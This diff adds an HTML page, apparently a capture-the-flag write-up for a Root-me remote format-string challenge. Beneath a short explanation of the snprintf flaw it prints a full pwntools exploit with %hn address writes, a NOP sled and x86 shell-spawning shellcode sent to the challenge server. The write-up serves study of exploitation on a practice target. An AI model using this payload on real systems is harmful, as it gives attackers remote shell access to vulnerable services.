@@ -1,0 +1,106 @@
+<html>
+ <head>
+<title> Remote Format </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Root-me </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Remote format string Bug </h1>
+   
+ <br> 
+
+<p> This vulnerability lies in <br> 
+<code> snprintf(outbuf,size(outbuf),inbuf) </code>
+<br>
+   As u can see snprintf 3'rd arguments must be format string which is provided us .<br><br>
+   Hence we can exploit it !!!. But the problem i faced was <br><br>
+   1) difference in addr of shellcode in bin and gdb so to overcome it we have add <b>Lengthy nopsled</b> <br>
+   2) the MSB value is < LSB bit so we have to write <b>%6$hn first and the %5$hn</b> </p>
+<br><br>
+
+<code>
+
+from pwn import *
+
+shellcode="\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+num=0xbfff
+num1=0xbfff -8
+num2 = 0xf7ac - num
+
+#num = 0xccc4+16
+#num1=  num - 78
+#num2 = 0xffff - num 
+#r=remote('localhost',56032)
+
+r=remote('challenge02.root-me.org',56032)
+fmtstr = pack(0x0804a04c)+pack(0x0804a04e)+"%"+str(num1)+"u"+"%6$hn"+"%"+str(num2)+"u"+"%5$hn"
+noplen = (1016-len(fmtstr)-len(shellcode))
+nopsled = "\x90"*noplen
+payload = fmtstr+nopsled+shellcode
+
+r.sendline(payload)
+r.interactive()
+</code>
+
+
+</body>
+</html>
